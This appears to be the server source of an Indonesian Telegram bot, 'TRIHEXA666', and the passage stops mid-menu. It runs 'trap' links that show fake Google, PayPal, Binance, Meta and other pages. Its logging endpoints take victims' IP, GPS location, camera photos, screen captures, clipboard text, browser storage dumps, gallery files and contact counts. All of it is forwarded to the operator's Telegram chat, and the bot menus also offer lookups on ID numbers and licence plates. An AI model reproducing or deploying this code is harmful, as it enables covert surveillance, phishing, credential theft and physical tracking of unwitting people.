import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import dns from "dns";
import util from "util";
import { Telegraf, Markup } from "telegraf";
import net from "net";
import crypto from "crypto";
import fs from "fs";
import { templates } from "./trapTemplates";
import AdmZip from "adm-zip";
import yts from "yt-search";
import play from "play-dl";


const resolveMx = util.promisify(dns.resolveMx);

// Timeout helper for fetch
const fetchWithTimeout = async (url: string, options: RequestInit = {}, timeoutMs: number = 4000) => {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const response = await fetch(url, { ...options, signal: controller.signal });
    clearTimeout(id);
    return response;
  } catch (error) {
    clearTimeout(id);
    throw error;
  }
};

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Stateless Trap ID Generation & Validation
  const generateTrapId = (chatId: number) => {
    return Buffer.from(`${chatId}-OSINT-${crypto.randomUUID().slice(0,4)}`).toString('base64url');
  };

  const getChatIdFromTrapId = (trapId: string): number | null => {
    try {
      const decoded = Buffer.from(trapId, 'base64url').toString('utf-8');
      if (decoded.includes('-OSINT-')) {
        const idStr = decoded.split('-OSINT-')[0];
        return parseInt(idStr, 10);
      }
      return null;
    } catch {
      return null;
    }
  };

  // Default to the Railway App URL as requested. It will still update dynamically based on host headers.
  let appHost = process.env.VITE_APP_URL || "https://telegram-bot-osint-v1-production.up.railway.app";

  const escapeHTML = (text: string) => {
    return text.replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#039;'
    }[m] || m));
  };

  // Initialize bot only once if token exists
  const botInstance = process.env.TELEGRAM_BOT_TOKEN ? new Telegraf(process.env.TELEGRAM_BOT_TOKEN) : null;

  app.use(express.json({ limit: '50mb' }));

  app.use((req, res, next) => {
    // Attempt to capture public URL
    const hostObj = req.headers['x-forwarded-host'] || req.headers.host;
    if (hostObj) {
      const hostStr = Array.isArray(hostObj) ? hostObj[0] : hostObj;
      if (hostStr.includes('.run.app') || hostStr.includes('.railway.app')) {
        const protocol = req.headers['x-forwarded-proto'] || 'https';
        appHost = `${protocol}://${hostStr}`;
      }
    }
    next();
  });

  // API routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  // ... (previous API routes continue here)
  
  // ========== IP LOGGER & CAMPHISH TRAP ENDPOINTS ==========
  app.get('/t/:tmplId/:id', (req, res) => {
    const { id, tmplId } = req.params;
    const chatId = getChatIdFromTrapId(id);
    if (!chatId) return res.status(404).send('<h2>Error 404: Link Invalid or Expired.</h2>');

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (botInstance) {
      const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      
      let msg = `🚩 <b>ᴛᴀʀɢᴇᴛ ʀᴇᴀᴄʜᴇᴅ ᴛʜᴇ ᴛʀᴀᴘ!</b> 🚩\n` +
                `━━━━━━━━━━━━━━━━━━━━\n\n` +
                `📅 <b>ᴡᴀᴋᴛᴜ:</b> <code>${timestamp} ᴡɪʙ</code>\n` +
                `🌐 <b>ɪᴘ ᴀᴅᴅʀᴇꜱꜱ:</b> <code>${escapeHTML(String(ip))}</code>\n` +
                `📁 <b>ᴛᴇᴍᴘʟᴀᴛᴇ:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'ᴅᴇꜰᴀᴜʟᴛ'}</code>\n` +
                `🖥️ <b>ᴜꜱᴇʀ-ᴀɢᴇɴᴛ:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `⏳ <i>ᴍᴇɴɢᴜɴɢɢᴀʜ ᴅᴀᴛᴀ ʜᴀʀᴅᴡᴀʀᴇ & ɢᴘꜱ...</i>`;

      botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
    }

    const template = templates[tmplId] || templates['1'];
    res.send(template.render(id));
  });

  // Backward compatibility alias
  app.get('/t/:id', (req: any, res) => {
    req.params.tmplId = '1';
    app._router.handle(req, res, () => {});
  });

  // Handle Device Metadata Upload
  app.post('/api/log/:id/info', (req, res) => {
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
      const data = req.body as any;
      const tmplId = data.tmplId || '1';
      const templateName = templates[tmplId] ? templates[tmplId].name : 'ᴅᴇꜰᴀᴜʟᴛ';
      
      let header = '🕵️‍♂️ <b>ꜱʏꜱᴛᴇᴍ ᴀᴜᴅɪᴛ: ɪᴅᴇɴᴛɪᴛʏ ᴄᴀᴘᴛᴜʀᴇᴅ</b>';
      let status = '🔄 <i>ᴛᴀʀɢᴇᴛ ꜱᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏꜱᴇꜱ ɪᴢɪɴ ᴛᴀᴍʙᴀʜᴀɴ...</i>';

      if (tmplId === 'google') {
        header = '🛡️ <b>ɢᴏᴏɢʟᴇ_ꜱᴇᴄᴜʀɪᴛʏ: ᴀᴄᴄᴇꜱꜱ ɢʀᴀɴᴛᴇᴅ</b>';
      } else if (tmplId === 'pegasus') {
        header = '💀 <b>ᴘᴇɢᴀꜱᴜꜱ_ᴠ9.3: ᴋᴇʀɴᴇʟ_ʙʀᴇᴀᴄʜ_ꜱᴜᴄᴄᴇꜱꜱ</b>';
        status = '🔥 <i>ꜱᴛᴀᴛᴜꜱ: ᴅᴇᴇᴘ ꜱᴄᴀɴ ʜᴀʀᴅᴡᴀʀᴇ ᴀᴋᴛɪꜰ.</i>';
      } else if (tmplId === 'file') {
        header = '📂 <b>ꜰɪʟᴇ_ᴛʀᴀɴꜱꜰᴇʀ: ᴀᴄᴄᴇꜱꜱ_ᴋᴇʏ_ᴄᴀᴘᴛᴜʀᴇᴅ</b>';
      } else if (tmplId === 'security_audit') {
        header = '🛡️ <b>ᴇᴄᴏꜱʏꜱᴛᴇᴍ_ᴀᴜᴅɪᴛ: ɪɴᴛᴇɢʀɪᴛʏ_ᴘᴀꜱꜱ</b>';
      } else if (tmplId === 'cloudflare') {
        header = '☁️ <b>ᴄʟᴏᴜᴅꜰʟᴀʀᴇ_ᴇᴅɢᴇ: ɪɴᴛᴇɢʀɪᴛʏ_ᴠᴇʀɪꜰɪᴇᴅ</b>';
      } else if (tmplId === 'meta_login') {
        header = '💬 <b>ᴍᴇᴛᴀ_ꜱᴏᴄɪᴀʟ: ɪᴅᴇɴᴛɪᴛʏ_ꜱʏɴᴄᴇᴅ</b>';
      } else if (tmplId === 'binance') {
        header = '💱 <b>ʙᴛᴄ_ᴄʀʏᴘᴛᴏ: ᴀꜱꜱᴇᴛ_ʀᴇᴄᴏɴ_ꜱᴜᴄᴄᴇꜱꜱ</b>';
      } else if (tmplId === 'paypal') {
        header = '💳 <b>ᴘᴀʏᴘᴀʟ_ꜰɪɴᴛᴇᴄʜ: ᴀᴜᴛʜ_ʙᴜꜱ_ɢʀᴀɴᴛᴇᴅ</b>';
      } else if (tmplId === 'steam') {
        header = '🎮 <b>ꜱᴛᴇᴀᴍ_ɢᴀᴍɪɴɢ: ɴᴏᴅᴇ_ꜱʏɴᴄ_ᴄᴏᴍᴘʟᴇᴛᴇ</b>';
      } else if (tmplId === 'netflix') {
        header = '🍿 <b>ɴᴇᴛꜰʟɪx_ꜱʏɴᴄ: ʜᴏᴜꜱᴇʜᴏʟᴅ_ɢʀɪᴅ_ᴍᴀᴛᴄʜ</b>';
      } else if (tmplId === 'tiktok') {
        header = '🎵 <b>ᴛɪᴋᴛᴏᴋ_ʀᴇᴄᴏɴ: ᴄʀᴇᴀᴛᴏʀ_ᴛᴇʟᴇᴍᴇᴛʀʏ</b>';
      } else if (tmplId === 'chatgpt') {
        header = '🤖 <b>ᴏᴘᴇɴᴀɪ_ɪɴᴛᴇʟʟɪɢᴇɴᴄᴇ: ᴅᴇᴠ_ᴇɴᴠ_ᴍᴀᴘᴇᴅ</b>';
      }

      let msg = `<b>${header}</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n\n` +
                  `📋 <b>ᴛᴇᴍᴘʟᴀᴛᴇ ɪɴꜰᴏ</b>\n` +
                  `├ ɴᴀᴍᴇ: <code>${escapeHTML(templateName)}</code>\n` +
                  `└ ꜰʟᴏᴡ: <code>ᴀᴅᴠᴀɴᴄᴇᴅ ᴀᴜᴅɪᴛ</code>\n\n` +
                  `🖥️ <b>ʜᴀʀᴅᴡᴀʀᴇ ꜱᴘᴇᴄꜱ</b>\n` +
                  `├ ᴘʟᴀᴛꜰᴏʀᴍ: <code>${escapeHTML(data.platform || 'ɴ/ᴀ')}</code>\n` +
                  `├ ʙʀᴏᴡꜱᴇʀ: <code>${escapeHTML(data.vendor || 'ɴ/ᴀ')} (${data.onLine ? 'ᴏɴʟɪɴᴇ' : 'ᴏꜰꜰʟɪɴᴇ'})</code>\n` +
                  `├ ᴄᴘᴜ ᴄᴏʀᴇꜱ: <code>${escapeHTML(String(data.cores || 'ɴ/ᴀ'))}</code>\n` +
                  `├ ʀᴀᴍ (ᴇꜱᴛ): <code>${escapeHTML(String(data.mem || 'ɴ/ᴀ'))} ɢʙ</code>\n` +
                  `├ ɢᴘᴜ: <code>${escapeHTML(data.gpu || 'ɴ/ᴀ')}</code>\n` +
                  `├ ᴠᴍ ꜱᴛᴀᴛᴜꜱ: <code>${escapeHTML(data.vmStatus || 'ɴ/ᴀ')}</code>\n` +
                  `└ ꜱᴄʀᴇᴇɴ: <code>${escapeHTML(data.screen || 'ɴ/ᴀ')}</code>\n\n` +
                  `🔋 <b>ᴇɴᴇʀɢʏ & ᴘᴇʀꜰ</b>\n` +
                  `├ ʙᴀᴛᴛᴇʀʏ: <code>${escapeHTML(data.battery || 'ɴ/ᴀ')}</code>\n` +
                  `├ ᴄᴏɴɴᴇᴄᴛ: <code>${escapeHTML(data.connection || 'ɴ/ᴀ')}</code>\n` +
                  `├ ʀᴇꜰʀᴇꜱʜ: <code>${escapeHTML(data.refreshRate || 'ᴠᴇʀɪꜰɪᴇᴅ')}</code>\n` +
                  `└ ɢᴀᴍᴜᴛ: <code>${escapeHTML(data.gamut || 'ɴ/ᴀ')}</code>\n\n` +
                  `🌍 <b>ʀᴇɢɪᴏɴ & ᴇɴᴠ</b>\n` +
                  `├ ᴛɪᴍᴇᴢᴏɴᴇ: <code>${escapeHTML(data.timezone || 'ɴ/ᴀ')}</code>\n` +
                  `├ ʟᴀɴɢꜱ: <code>${escapeHTML(data.langs || 'ɴ/ᴀ')}</code>\n` +
                  `└ ʀᴇꜰᴇʀʀᴇʀ: <code>${escapeHTML(data.ref || 'ᴅɪʀᴇᴄᴛ')}</code>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `${status}`;

      botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
    }
    res.sendStatus(200);
  });

  // Handle Extra Data (Clipboard, Media, Screen, etc)
  app.post('/api/log/:id/extra', (req, res) => {
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
      const data = req.body as any;
      let extraMsg = `📎 <b>ADVANCED_MODULE_SYNC [STABLE]</b>\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n`;
      let hasData = false;
      
      const addSection = (title: string, content: string) => {
        if (extraMsg.length + content.length > 3900) {
            botInstance.telegram.sendMessage(chatId, extraMsg + `\n<i>(Konten berlanjut...)</i>`, { parse_mode: 'HTML' }).catch(() => {});
            extraMsg = `📎 <b>CONTINUED_LOGS</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
        }
        extraMsg += `<b>${title}</b>\n${content}\n\n`;
        hasData = true;
      };

      if (data.visual_identity) {
        try {
          const base64Data = data.visual_identity.replace(/^data:image\/\w+;base64,/, "");
          const buffer = Buffer.from(base64Data, 'base64');
          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: '📸 <b>TARGET_VISUAL_IDENTITY_CAPTURED</b>', parse_mode: 'HTML' }).catch(() => {});
          hasData = true;
        } catch(e) {}
      }

      if (data.screen_capture) {
        try {
          const base64Data = data.screen_capture.replace(/^data:image\/\w+;base64,/, "");
          const buffer = Buffer.from(base64Data, 'base64');
          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: '🖥️ <b>SCREEN_GRID_RECON_SUCCESS</b>', parse_mode: 'HTML' }).catch(() => {});
          hasData = true;
        } catch(e) {}
      }

      if (data.hardware_brand_profile) {
        try {
          const h = typeof data.hardware_brand_profile === 'string' ? JSON.parse(data.hardware_brand_profile) : data.hardware_brand_profile;
          addSection(`🛠️ HARDWARE_IDENTITY`,
                     `├ Model: <code>${escapeHTML(h.model || 'N/A')}</code>\n` +
                     `├ Form: <code>${escapeHTML(h.formFactor || 'N/A')}</code>\n` +
                     `└ Arch: <code>${escapeHTML(h.architecture || 'N/A')}</code> (${h.bitness || '?'}bit)`);
        } catch(e) {}
      }

      if (data.cpu_compute_score || data.perf_cores) {
        addSection(`⚡ COMPUTATIONAL_BENCHMARK`,
                   `├ Engine: <code>OSINT_Ham_v3</code>\n` +
                   `├ Score: <code>${data.cpu_compute_score || 'N/A'}</code>\n` +
                   `└ Resources: <code>${data.perf_cores || 'N/A'} Cores / ${data.perf_mem || 'N/A'} GB RAM</code>`);
      }

      if (data.clipboard_sync || data.clipboard) {
        const clip = data.clipboard_sync || data.clipboard;
        addSection(`📋 CLIPBOARD_SYNC`, `└ Content: <pre>${escapeHTML(clip.substring(0, 1000))}</pre>`);
      }

      if (data.media_hardware) {
        addSection(`🎙️ AV_HARDWARE_INVENTORY`, `<pre>${escapeHTML(data.media_hardware.substring(0, 1000))}</pre>`);
      }

      if (data.file_name) {
        addSection(`📂 FILE_SYSTEM_ASSETS`,
                   `├ Name: <code>${escapeHTML(data.file_name)}</code>\n` +
                   `├ Type: <code>${data.file_type}</code>\n` +
                   `└ Size: <code>${(data.file_size / 1024).toFixed(2)} KB</code>`);
      }

      if (data.gpu_full_profile) {
        try {
          const gpu = typeof data.gpu_full_profile === 'string' ? JSON.parse(data.gpu_full_profile) : data.gpu_full_profile;
          addSection(`🎮 GRAPHICS_SUBSYSTEM`,
                      `├ Vendor: <code>${escapeHTML(gpu.vendor)}</code>\n` +
                      `├ Renderer: <code>${escapeHTML(gpu.renderer)}</code>\n` +
                      `├ GL_Ver: <code>${escapeHTML(gpu.gl_version)}</code>\n` +
                      `└ Shading: <code>${escapeHTML(gpu.shading_lang)}</code>`);
        } catch(e) {}
      }

      if (data.media_devices) {
        addSection(`📷 MEDIA_PERIPHERALS`, `<pre>${escapeHTML(data.media_devices.substring(0, 1000))}</pre>`);
      }

      if (data.canvas_fp || data.audio_fp) {
        let fpt = ``;
        if (data.canvas_fp) fpt += `├ Canvas: <code>${escapeHTML(data.canvas_fp)}</code>\n`;
        if (data.audio_fp) fpt += `└ Audio: <code>${escapeHTML(data.audio_fp)}</code>`;
        if (fpt) addSection(`🧬 BROWSER_FINGERPRINTS`, fpt);
      }

      if (data.battery_level) {
        addSection(`🔋 POWER_TELEMETRY`,
                    `├ Level: <code>${data.battery_level}</code>\n` +
                    `├ Plugged: <code>${data.battery_charging ? 'AC_POWER' : 'BATTERY'}</code>\n` +
                    `└ Sec_T: <code>${data.battery_time}</code>`);
      }

      if (data.fonts_count || data.installed_fonts) {
        addSection(`🔡 TYPE_FINGERPRINT`,
                    `├ Count: <code>${data.fonts_count || '?' }</code>\n` +
                    `└ Registry: <code>${escapeHTML((data.installed_fonts || '').substring(0, 300))}</code>`);
      }

      const apis = ['api_bluetooth', 'api_usb', 'api_hid', 'api_serial', 'api_midi', 'api_idle', 'api_contacts', 'api_wake', 'api_storage'];
      let apiTxt = '';
      apis.forEach(k => {
        if (data[k] !== undefined) apiTxt += `${data[k] ? '✅' : '❌'} ${k.replace('api_', '').toUpperCase()}\n`;
      });
      if (apiTxt) addSection(`🧱 HARDWARE_API_AVAILABILITY`, apiTxt);

      if (data.social_active || data.social_inactive) {
         let socialTxt = '';
         if (data.social_active) socialTxt += `├ Active: <code>${data.social_active}</code> (${data.load_ms || 'N/A'}ms)\n`;
         if (data.social_inactive) socialTxt += `└ Inactive: <code>${data.social_inactive}</code>\n`;
         addSection(`🤝 SOCIAL_PRESENCE_SCAN`, socialTxt);
      }

      if (data.network_rtt || data.latency) {
        addSection(`🛰️ LATENCY_PRECISION_MAP`,
                    `├ Node: <code>${data.network_rtt || 'N/A'}</code>\n` +
                    `└ RTT: <code>${data.latency || 'N/A'}ms</code>`);
      }

      if (data.contacts_leaked) {
        let count = 0;
        try { count = (typeof data.contacts_leaked === 'string' ? JSON.parse(data.contacts_leaked) : data.contacts_leaked).length; } catch(e) {}
        addSection(`👥 SOCIAL_GRAPH_EXTRACTED`, `└ Total Peers: <code>${count} items</code>`);
      }

      if (data.storage_mb) {
        addSection(`💾 STORAGE_FORENSICS`,
                    `├ Used: <code>${data.storage_mb} MB</code>\n` +
                    `└ Quota: <code>${data.quota_gb} GB</code>`);
      }
      
      if (data.incognito_audit !== undefined || data.devtools_open !== undefined) {
        addSection(`🕵️ ENVIRONMENT_INTEGRITY`,
                    `├ Stealth: <b>${data.incognito_audit ? 'PRIVATE' : 'NORMAL'}</b>\n` +
                    `└ Debug: <b>${data.devtools_open ? 'DETECTED' : 'CLEAN'}</b>`);
      }
      
      if (data.net_effective) {
        addSection(`🌐 NETWORK_LAYER_DETAILS`,
                    `├ Type: <code>${data.net_effective}</code>\n` +
                    `├ RTT: <code>${data.net_rtt}ms</code>\n` +
                    `└ Downlink: <code>${data.net_downlink}Mb/s</code>`);
      }

      if (data.storage_ls_full || data.storage_ss_full) {
        let storageTxt = '';
        let lsObj = {};
        let ssObj = {};

        if (data.storage_ls_full) {
          try {
            lsObj = typeof data.storage_ls_full === 'string' ? JSON.parse(data.storage_ls_full) : data.storage_ls_full;
            storageTxt += `├ <b>LocalStorage:</b> <code>${Object.keys(lsObj).length} keys</code> (Extracted to ZIP)\n`;
          } catch(e) { storageTxt += `├ LocalStorage: [Captured but Parse-Error]\n`; }
        }
        if (data.storage_ss_full) {
          try {
            ssObj = typeof data.storage_ss_full === 'string' ? JSON.parse(data.storage_ss_full) : data.storage_ss_full;
            storageTxt += `└ <b>SessionStorage:</b> <code>${Object.keys(ssObj).length} keys</code> (Extracted to ZIP)\n`;
          } catch(e) { storageTxt += `└ SessionStorage: [Captured but Parse-Error]\n`; }
        }
        
        try {
          const zip = new AdmZip();
          zip.addFile("localStorage.json", Buffer.from(JSON.stringify(lsObj, null, 2), "utf8"));
          zip.addFile("sessionStorage.json", Buffer.from(JSON.stringify(ssObj, null, 2), "utf8"));
          const zipBuffer = zip.toBuffer();
          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `StorageDump_${id}.zip` }, { caption: "💾 <b>ꜱᴛᴏʀᴀɢᴇ_ᴅᴜᴍᴘ_ʀᴇᴄᴏɴ_ꜱᴜᴄᴄᴇꜱꜱ</b>", parse_mode: 'HTML' }).catch(() => {});
        } catch (e) {}

        addSection(`💾 PERSISTENT_MEMORY_DUMP`, storageTxt);
      }

      if (data.files_gallery) {
        try {
          const zip = new AdmZip();
          let fCount = 0;
          for (let f of data.files_gallery) {
            zip.addFile(f.name || `image_${fCount}.jpg`, Buffer.from(f.data, "base64"));
            fCount++;
          }
          const zipBuffer = zip.toBuffer();
          botInstance.telegram.sendDocument(chatId, { source: zipBuffer, filename: `GalleryDump_${id}.zip` }, { caption: "📸 <b>GALLERY_SYNC_RECON_SUCCESS</b>", parse_mode: 'HTML' }).catch(() => {});
          addSection(`📸 GALLERY_DUMP`, `└ <code>${fCount} files extracted to ZIP</code>`);
        } catch (e) {}
      }

      if (data.display_hz || data.orientation) {
        addSection(`📺 VISUAL_PERIPHERALS`,
                    `├ Refresh: <code>${data.display_hz} Hz</code>\n` +
                    `└ Orient: <code>${data.orientation}</code>`);
      }

      // Image delivery
      if (data.screen_capture) {
        try {
          const buffer = Buffer.from(data.screen_capture.split(',')[1], 'base64');
          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `🖥️ SCREEN_CAPTURE [RESTORED]` }).catch(() => {});
          hasData = true;
        } catch(e) {}
      }
      if (data.visual_identity) {
        try {
          const buffer = Buffer.from(data.visual_identity.split(',')[1], 'base64');
          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `📸 TARGET_VISUAL_IDENTITY [REAL-TIME]` }).catch(() => {});
          hasData = true;
        } catch(e) {}
      }

      if (hasData) {
        extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
                    `🏴‍☠️ <b>DATA_SYNC_COMPLETE: PEGASUS v9.2</b>`;
        botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error);
      }
    }
    res.sendStatus(200);
  });
  app.post('/api/log/:id/gps', (req, res) => {
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
      const { lat, lon, acc, tmplId } = req.body;
      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
      
      let header = '📍 <b>ɢᴘꜱ_ꜰɪx: ᴛᴀʀɢᴇᴛ_ʟᴏᴄᴀᴛᴇᴅ</b>';
      if (tmplId === 'google') {
        header = '⚡ <b>ᴛʀᴜꜱᴛᴇᴅ_ʟᴏᴄᴀᴛɪᴏɴ_ꜱʏɴᴄ</b>';
      } else if (tmplId === 'maps') {
        header = '🗺️ <b>ᴍᴀᴘꜱ_ᴘʀᴇᴄɪꜱɪᴏɴ_ᴄᴏᴏʀᴅɪɴᴀᴛᴇꜱ</b>';
      } else if (tmplId === 'pegasus') {
        header = '💀 <b>ᴘᴇɢᴀꜱᴜꜱ: ʀᴇᴀʟᴛɪᴍᴇ_ɢᴘꜱ_ɪɴᴛᴇʀᴄᴇᴘᴛ</b>';
      }

      const msg = `<b>${header}</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n\n` +
                  `🛰️ <b>ᴄᴏᴏʀᴅɪɴᴀᴛᴇꜱ</b>\n` +
                  `├ Lat: <code>${lat}</code>\n` +
                  `├ Lon: <code>${lon}</code>\n` +
                  `└ Acc: <code>${acc} meter</code>\n\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🔗 <b>ɴᴀᴠɪɢᴀᴛɪᴏɴ ʟɪɴᴋ</b>\n` +
                  `🌐 <a href="${mapLink}">ʟɪʜᴀᴛ ʟᴏᴋᴀꜱɪ ᴅɪ ɢᴏᴏɢʟᴇ ᴍᴀᴘꜱ</a>\n\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🏁 <i>ꜱᴛᴀᴛᴜꜱ: ᴠᴇʀɪꜰɪᴋᴀꜱɪ ꜱᴘᴀꜱɪᴀʟ ʙᴇʀʜᴀꜱɪʟ.</i>`;

      botInstance.telegram.sendMessage(chatId, msg, { 
        parse_mode: 'HTML', 
        link_preview_options: { is_disabled: true }
      }).catch(console.error);
    }
    res.sendStatus(200);
  });
  // ==============================================

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use((req, res, next) => {
      // Don't intercept /t or /api
      if (req.path.startsWith('/t/') || req.path.startsWith('/api')) {
        return next();
      }
      vite.middlewares(req, res, next);
    });
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res, next) => {
      // Avoid sending index.html for api or /t routes by letting them fall through
      if (req.path.startsWith('/api') || req.path.startsWith('/t/')) {
        return next();
      }
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  // TELEGRAM BOT SETUP
  if (process.env.TELEGRAM_BOT_TOKEN) {
    const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);

    const startMsgText = `━━━━━━━ ᴛʀɪʜᴇxᴀ666 ━━━━━━━\n\n` +
                         `<b>ᴛʀɪʜᴇxᴀ666 - ᴘʀɪɴᴄᴇ ᴏꜰ ᴏꜱɪɴᴛ ᴀɴᴅ ʟᴏɢɢᴇʀ ʟɪɴᴋ ᴠ.1</b>\n\n` +
                         `<b>ᴏᴡɴᴇʀ : ᴡʜʏʟᴀᴜɢʜ404</b>\n\n` +
                         `ᴀʙᴏᴜᴛ ᴛʀɪʜᴇxᴀ666 : ᴅɪᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴏʟᴇʜ ᴡʜʏʟᴀᴜɢʜ404 ꜱᴇʙᴀɢᴀɪ ᴀʟᴀᴛ ᴏꜱɪɴᴛ ᴅᴀɴ ᴘᴇʟᴀᴄᴀᴋᴀɴ ꜱᴇᴄᴀʀᴀ ᴍᴇɴᴅᴀʟᴀᴍ. ᴍᴇʟɪʙᴀᴛᴋᴀɴ ᴘᴇɴɢɢᴜɴᴀᴀɴ ɪɴꜰᴏʀᴍᴀꜱɪ ꜱᴜᴍʙᴇʀ ᴛᴇʀʙᴜᴋᴀ. ʙᴏᴛ ɪɴɪ ᴅɪʜᴀʀᴀᴘᴋᴀɴ ᴍᴀᴍᴘᴜ ᴜɴᴛᴜᴋ ᴍᴇᴍᴇɴᴜʜɪ ᴛᴜɢᴀꜱɴʏᴀ ꜱᴇʙᴀɢᴀɪ ʙᴀɢɪᴀɴ ᴅᴀʀɪ ᴀʟᴀᴛ ᴡʜʏʟᴀᴜɢʜ404.\n\n` +
                         `━━━━━━━━━━━━━━━━━━━━`;
    
    const mainKeyboard = Markup.inlineKeyboard([
      [Markup.button.callback('🇮🇩 ʟᴏᴄᴀʟ ᴏꜱɪɴᴛ', 'menu_osint_basic'), Markup.button.callback('📡 ɢʟᴏʙᴀʟ ʀᴇᴄᴏɴ', 'menu_osint_adv')],
      [Markup.button.callback('🛠️ ʜᴀʀᴅ ᴛᴏᴏʟꜱ', 'menu_tools'), Markup.button.callback('🎣 ꜱᴛᴇᴀʟᴛʜ ʟᴏɢ', 'menu_logger')],
      [Markup.button.callback('🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ', 'menu_games'), Markup.button.callback('🎵 ᴍᴇᴅɪᴀ ꜱʏɴᴄ', 'menu_media')],
      [Markup.button.callback('ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ', 'menu_help')]
    ]);

    bot.start((ctx) => ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }));

    bot.action('menu_main', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      ctx.editMessageText(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }).catch(() => {});
    });

    bot.action('menu_osint_basic', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🇮🇩 ʟᴏᴄᴀʟ ᴏꜱɪɴᴛ ᴍᴏᴅᴜʟᴇ</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `• <b>/nik [ɴᴏᴍᴏʀ]</b>\n` +
        `  └ <i>ᴋᴛᴘ ɪᴅᴇɴᴛɪᴛʏ ᴀɴᴀʟʏᴛɪᴄꜱ & ᴍᴀᴘᴘɪɴɢ</i>\n\n` +
        `• <b>/plat [ɴᴏᴍᴏʀ]</b>\n` +
        `  └ <i>ᴠᴇʜɪᴄʟᴇ ʀᴇɢ ᴀʀᴇᴀ ɪᴅᴇɴᴛɪꜰɪᴄᴀᴛɪᴏɴ</i>\n\n` +
        `• <b>/ip [ᴛᴀʀɢᴇᴛ]</b>\n` +
        `  └ <i>ᴅᴇᴇᴘ ɪᴘ ɢᴇᴏʟᴏᴄᴀᴛɪᴏɴ ɪɴᴛᴇʟ</i>\n\n` +
        `• <b>/email [ᴇᴍᴀɪʟ]</b>\n` +
        `  └ <i>ꜱᴍᴛᴘ ᴍx ᴠᴀʟɪᴅᴀᴛᴏʀ ᴄʜᴇᴄᴋ</i>\n\n` +
        `• <b>/username [ᴜꜱᴇʀ]</b>\n` +
        `  └ <i>ꜱᴏᴄɪᴀʟ ꜰᴏᴏᴛᴘʀɪɴᴛ ᴍᴀᴘᴘɪɴɢ</i>\n\n` +
        `• <b>/whois [ᴅᴏᴍᴀɪɴ]</b>\n` +
        `  └ <i>ʀᴇɢɪꜱᴛʀᴀʀ ʀᴇᴄᴏɴɴᴀɪꜱꜱᴀɴᴄᴇ</i>\n\n` +
        `• <b>/dns [ᴅᴏᴍᴀɪɴ]</b>\n` +
        `  └ <i>ᴅɴꜱ ʀᴇᴄᴏʀᴅ ᴍᴀᴘᴘɪɴɢ</i>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_osint_adv', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>📡 ɢʟᴏʙᴀʟ ʀᴇᴄᴏɴ ᴍᴏᴅᴜʟᴇ</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `• <b>/headers [ᴜʀʟ]</b>\n` +
        `  └ <i>ꜱᴇᴄᴜʀɪᴛʏ ʜᴇᴀᴅᴇʀ ᴀᴜᴅɪᴛ & ᴀɴᴀʟʏꜱɪꜱ</i>\n\n` +
        `• <b>/dork [ᴋᴇʏᴡᴏʀᴅ]</b>\n` +
        `  └ <i>ᴀᴅᴠᴀɴᴄᴇᴅ ɢᴏᴏɢʟᴇ ᴅᴏʀᴋꜱ ᴇɴɢɪɴᴇ</i>\n\n` +
        `• <b>/bininfo [ʙɪɴ]</b>\n` +
